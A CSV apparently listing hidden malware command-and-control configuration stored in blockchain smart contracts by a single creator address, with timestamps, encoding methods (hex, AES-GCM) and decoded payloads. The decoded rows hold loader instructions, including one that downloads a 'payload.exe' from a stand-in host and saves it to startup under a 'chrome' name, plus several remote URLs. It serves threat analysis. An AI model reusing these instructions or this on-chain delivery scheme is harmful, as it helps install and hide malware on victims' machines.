contract,contract_creator,timestamp,method,decoded,raw
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T11:22:40+00:00,hex,all:savestartupname:chrome:url:http://example.com/payload.exe,616c6c3a73617665737461727475706e616d653a6368726f6d653a75726c3a687474703a2f2f6578616d706c652e636f6d2f7061796c6f61642e657865
0xf9438b4e3200ae1611ed3d03310c803fddf67672,0xcaf2c54e400437da717cf215181b170f65187abf,2025-10-31T11:22:40+00:00,hex,all:url:https://skr.sh/vYMZ8HWGID6,616c6c3a75726c3a68747470733a2f2f736b722e73682f76594d5a38485747494436
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T10:50:13+00:00,hex+aes-gcm,all:url:https://tyutyuцукукепукепукеукеп,774457756d646f34326f4454336642393a706f48653232744d64555850555a592f43642b634f454c6d464d7630365248316163754c5446474f636f2b524d4b335057745a79376535452f35525075742f6a623458464e66655368526b655768442f7042757a7476636c3043596b444c58415654593d
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T10:50:13+00:00,plaintext,https://example.com/initial,https://example.com/initial
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T10:57:25+00:00,hex+aes-gcm,all:url:https://t1231231233,6f4b4f66686a5a6e47384c41666878673a624e78374975776c3136785254307370364f30346a624468335a42424e49576e784e725a6c706d6848453774776a6642755834527336466379413d3d
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T10:57:25+00:00,hex+aes-gcm,all:url:https://tyutyuцукукепукепукеукеп,774457756d646f34326f4454336642393a706f48653232744d64555850555a592f43642b634f454c6d464d7630365248316163754c5446474f636f2b524d4b335057745a79376535452f35525075742f6a623458464e66655368526b655768442f7042757a7476636c3043596b444c58415654593d
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T11:02:13+00:00,hex+aes-gcm,all:url:https://111111111,476f79475750476d6d32786c342f5a573a513135364749357445782b79662b353439706763344a722f75323666783576486e3633446369664d32376175756d52376e492b4b4a63493d
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T11:02:13+00:00,hex+aes-gcm,all:url:https://t1231231233,6f4b4f66686a5a6e47384c41666878673a624e78374975776c3136785254307370364f30346a624468335a42424e49576e784e725a6c706d6848453774776a6642755834527336466379413d3d
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T11:04:45+00:00,hex+aes-gcm,all:url:https://111111111,476f79475750476d6d32786c342f5a573a513135364749357445782b79662b353439706763344a722f75323666783576486e3633446369664d32376175756d52376e492b4b4a63493d
0x55b4f951d5ac035c21b170c73c0a930a641b718c,0xcaf2c54e400437da717cf215181b170f65187abf,2025-11-02T11:04:45+00:00,hex+aes-gcm,all:url:https://вапвапвапап,4a4a6c767051576f653843722b3565743a504564332f676b693551505930484b70755673534474536a534b32426632515745744f772f4b714a563432324471495a77756157336358682b49684d752f483147467a694c334632
